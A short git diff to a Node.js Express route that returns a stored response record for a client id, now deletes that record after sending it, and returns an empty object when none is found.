@@ -7,7 +7,7 @@ const Utils = require("../../Utils/utilFunctions");
 //Validate cookie for incoming requests
 router.use(webCookieValidator);
 
-//Powershell response
+//regular response from client
 router.route('/').post((req,res) =>{
     const clientId = req.body.id;
     Response.findOne({client_id:clientId},{},{},function(err,response){
@@ -16,10 +16,15 @@ router.route('/').post((req,res) =>{
             res.sendStatus(400);
         }
         else{
-            if(response)
+            if(response !== null){
                 res.send(response);
+                Response.deleteOne({client_id:clientId},{},function(err){
+                    if(err)
+                        Utils.LogToFile(`Error removing response for client ${err} ID: ${clientId}`);
+                })
+            }
             else
-                res.send();
+                res.send({});
         }
    });
 });
